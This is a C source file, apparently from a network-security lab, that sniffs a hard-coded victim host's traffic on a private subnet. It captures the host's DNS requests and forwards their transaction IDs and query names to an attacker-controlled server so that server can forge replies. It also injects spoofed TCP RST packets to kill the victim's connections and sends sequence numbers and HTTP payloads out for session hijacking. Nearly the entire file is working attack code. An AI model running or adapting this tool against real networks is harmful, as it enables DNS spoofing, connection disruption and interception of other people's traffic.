#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <stdarg.h>
#include <time.h>
#include <netinet/udp.h>
#include <netpacket/packet.h>

#define MAX_ETHER 1518
#define INTERFACE "eth0"
#define LOCAL_SERVER_HOST "172.20.0.104"
#define LOCAL_SERVER_PORT 9090
#define VICTIM_IP "172.20.0.102"
#define SIZE_ETHERNET 14

// Thêm define cho DNS
#define DNS_PORT 53

// Save TCP connection state for more accurate spoofing
struct tcp_conn_state {
    uint32_t seq;
    uint32_t ack;
    uint16_t sport;
    uint16_t dport;
    uint16_t window;
    uint8_t flags;
};

struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// Use a single DNS structure instead of two different ones
struct dns_info {
    uint16_t txid;      // Transaction ID
    uint16_t flags;     // Flags field
    uint16_t qdcount;   // Number of questions
    uint16_t ancount;   // Number of answers
    uint16_t nscount;   // Number of authority records
    uint16_t arcount;   // Number of additional records
    char query[256];    // Query name buffer
    uint16_t src_port;  // Source port for response
};

// Checksum calculation
uint16_t chksum(unsigned char *buf, size_t buflen) {
    uint32_t sum = 0, i;
    for(i=0; i<buflen-1; i+=2) sum += *(uint16_t*)&buf[i];
    if(buflen & 1) sum += buf[buflen - 1];
    return ~((sum >> 16) + (sum & 0xffff));
}

void send_to_local_server(struct tcp_conn_state *state, const char *data, int data_len) {
    int sockfd;
    struct sockaddr_in servaddr;
    char recv_buffer[1024];

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        return;
    }

    // Configure server address
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);

    // Set socket timeout
    struct timeval tv;
    tv.tv_sec = 1;  // 1 second timeout
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Add connection state info to message
    char message[4096];
    snprintf(message, sizeof(message),
            "VICTIM_HTTP\n"
            "SEQ=%u\n"
            "ACK=%u\n" 
            "SPORT=%u\n"
            "DPORT=%u\n"
            "WINDOW=%u\n"
            "FLAGS=0x%02x\n"
            "DATA=%.*s",
            state->seq, state->ack,
            state->sport, state->dport,
            state->window, state->flags,
            data_len, data);

    // Send message
    printf("\nSending to server: %s\n", message);
    if (sendto(sockfd, message, strlen(message), 0, 
        (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        printf("Failed to send: %s\n", strerror(errno));
        close(sockfd);
        return;
    }

    // Wait for acknowledgment
    socklen_t len = sizeof(servaddr);
    int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                     (struct sockaddr *)&servaddr, &len);
    
    if (n > 0) {
        recv_buffer[n] = '\0';
        printf("Received ACK: %s\n", recv_buffer);
    } else {
        printf("No acknowledgment received\n");
    }

    close(sockfd);
}

// Add debug logging function
void debug_log(const char *format, ...) {
    va_list args;
    va_start(args, format);
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    printf("[DEBUG %s] ", timestamp);
    vprintf(format, args);
    printf("\n");
    fflush(stdout);
    va_end(args);
}

// Add debug print function for packet contents
void print_packet_content(unsigned char *buffer, int size) {
    printf("\n==== Packet Content ====\n");
    // Print raw bytes in hex and ASCII
    for(int i = 0; i < size; i++) {
        if(i % 16 == 0) printf("\n%04X: ", i);
        printf("%02X ", buffer[i]);
        if((i + 1) % 16 == 0) {
            printf("  ");
            // Print ASCII representation
            for(int j = i - 15; j <= i; j++) {
                if(buffer[j] >= 32 && buffer[j] <= 126)
                    printf("%c", buffer[j]);
                else
                    printf(".");
            }
        }
    }
    printf("\n=====================\n");
}

// Function to send TCP reset packet
// This will terminate the original connection with server
void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
    printf("[INFO] Sending TCP RST packet from %s to %s\n",
           inet_ntoa(*(struct in_addr*)&iph->daddr),
           inet_ntoa(*(struct in_addr*)&iph->saddr));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[ERROR] Socket creation failed");
        return;
    }

    printf("[INFO] Raw socket created\n");

    // Prepare RST packet buffer
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Setup IP header exactly like ICMP example
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(packet));
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = iph->daddr;  // Swap source and destination
    ip->daddr = iph->saddr;
    
    // Setup TCP header with exact sequence numbers
    tcp->th_sport = tcph->th_dport;
    tcp->th_dport = tcph->th_sport;
    tcp->th_seq = tcph->th_ack;
    tcp->th_ack = htonl(ntohl(tcph->th_seq) + 1);
    tcp->th_off = 5;
    tcp->th_flags = TH_RST | TH_ACK;
    tcp->th_win = 0;

    // Calculate checksums
    ip->check = 0;
    ip->check = chksum((unsigned char *)ip, sizeof(struct iphdr));
    
    // Add TCP pseudo header checksum like ICMP example
    struct pseudo_header {
        uint32_t source_address;
        uint32_t dest_address;
        uint8_t placeholder;
        uint8_t protocol;
        uint16_t tcp_length;
    } psh;

    psh.source_address = ip->saddr;
    psh.dest_address = ip->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char *pseudogram = malloc(sizeof(psh) + sizeof(struct tcphdr));
    memcpy(pseudogram, &psh, sizeof(psh));
    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));
    tcp->th_sum = chksum((unsigned char*)pseudogram, sizeof(psh) + sizeof(struct tcphdr));
    free(pseudogram);

    printf("[DEBUG] TCP RST packet created with SEQ=%u ACK=%u\n", 
           ntohl(tcp->th_seq), ntohl(tcp->th_ack));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    // Send RST packet multiple times like ICMP example
    for(int i = 0; i < 3; i++) {
        if (sendto(sock, packet, sizeof(packet), 0, 
            (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[ERROR] sendto() failed");
        } else {
            printf("[SUCCESS] RST packet %d sent to %s\n", 
                   i+1, inet_ntoa(dest.sin_addr));
        }
        usleep(1000);
    }

    close(sock);
}

// Update function to accept port number
void send_dns_to_local_server(struct dns_info *dns, uint16_t sport) {
    int sockfd;
    struct sockaddr_in servaddr;
    char recv_buffer[1024];

    printf("\n[+] Creating connection to local server\n"); 
    
    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("[-] Socket creation failed");
        return;
    }

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);

    // Format DNS request message
    char message[1024];
    snprintf(message, sizeof(message),
            "DNS_REQUEST\n"
            "TXID=%u\n"
            "QUERY=%s\n" 
            "SPORT=%u\n",
            dns->txid, dns->query, sport);

    printf("[+] Sending DNS info: %s\n", message);

    // Send and wait for ACK
    if (sendto(sockfd, message, strlen(message), 0,
               (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("[-] Failed to send DNS info");
    } else {
        printf("[+] DNS info sent successfully\n");
        
        // Wait for ACK
        socklen_t len = sizeof(servaddr);
        int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                     (struct sockaddr *)&servaddr, &len);
        
        if (n > 0) {
            recv_buffer[n] = '\0';
            printf("[+] Received ACK: %s\n", recv_buffer);
        }
    }

    close(sockfd);
}

/*
CHỨC NĂNG:
1. Bắt các DNS request từ victim (port 53)
2. Parse DNS header để lấy transaction ID và query name
3. Forward DNS info tới local_server để tạo fake response
4. Không cần gửi RST cho DNS packets
*/

void process_packet(unsigned char *packet, int size) {
    struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
    
    // STEP 1: Bắt và phân tích DNS request
    if (iph->protocol == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
        
        printf("\n=== STEP 1: DNS Request Capture ===\n");
        printf("Source IP: %s\n", inet_ntoa(*(struct in_addr*)&iph->saddr));
        printf("Source Port: %d\n", ntohs(udph->uh_sport));
        printf("Dest Port: %d\n", ntohs(udph->uh_dport));
        
        // Kiểm tra DNS request từ victim
        if (ntohs(udph->uh_dport) == 53 && 
            strcmp(inet_ntoa(*(struct in_addr*)&iph->saddr), VICTIM_IP) == 0) {
            
            printf("\n[+] Valid DNS request detected!\n");
            
            // STEP 2: Parse DNS request
            struct dns_info dns = {0};
            char *dns_data = (char*)(packet + SIZE_ETHERNET + iph->ihl*4 + sizeof(struct udphdr));
            
            memcpy(&dns.txid, dns_data, 2); 
            dns.txid = ntohs(dns.txid);
            
            // Extract domain name
            char *query = dns_data + 12;
            int query_len = 0;
            while(query[query_len] && query_len < 255) query_len++;
            
            memcpy(dns.query, query, query_len);
            dns.query[query_len] = '\0';
            dns.src_port = ntohs(udph->uh_sport);
            
            printf("\n=== STEP 2: DNS Request Info ===\n");
            printf("Transaction ID: %u\n", dns.txid);
            printf("Query Domain: %s\n", dns.query);
            printf("Source Port: %u\n", dns.src_port);
            
            // STEP 3: Forward tới local_server
            printf("\n=== STEP 3: Forwarding to Local Server ===\n");
            send_dns_to_local_server(&dns, dns.src_port);
        }
    }

    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
        struct sockaddr_in source;
        source.sin_addr.s_addr = iph->saddr;

        if (strcmp(inet_ntoa(source.sin_addr), VICTIM_IP) == 0) {
            printf("[INFO] TCP packet captured from %s:%d to port %d\n",
                   VICTIM_IP, ntohs(tcph->th_sport), ntohs(tcph->th_dport));

            // Store connection state
            struct tcp_conn_state state = {
                .seq = ntohl(tcph->th_seq),
                .ack = ntohl(tcph->th_ack),
                .sport = ntohs(tcph->th_sport),
                .dport = ntohs(tcph->th_dport),
                .window = ntohs(tcph->th_win),
                .flags = tcph->th_flags
            };

            // Extract HTTP data
            int header_size = SIZE_ETHERNET + (iph->ihl * 4) + (tcph->th_off * 4);
            char *data = packet + header_size;
            int data_len = size - header_size;

            // First send RST to kill original connection
            send_tcp_reset(iph, tcph);

            // Then forward complete connection info to local server
            send_to_local_server(&state, data, data_len);
        }
    }
}

int main() {
    int sockfd;
    struct ifreq ifr;
    unsigned char *buffer = malloc(MAX_ETHER);
    
    // Create raw socket
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Get interface index
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ);
    if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        exit(1);
    }

    printf("[+] Sniffer started on %s\n", INTERFACE); 
    printf("[+] Watching victim IP: %s\n", VICTIM_IP);
    printf("[+] Forwarding to: %s:%d\n", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);

    while(1) {
        int packet_size = recvfrom(sockfd, buffer, MAX_ETHER, 0, NULL, NULL);
        if(packet_size > 0) {
            process_packet(buffer, packet_size);
        }
    }

    close(sockfd);
    free(buffer);
    return 0;
}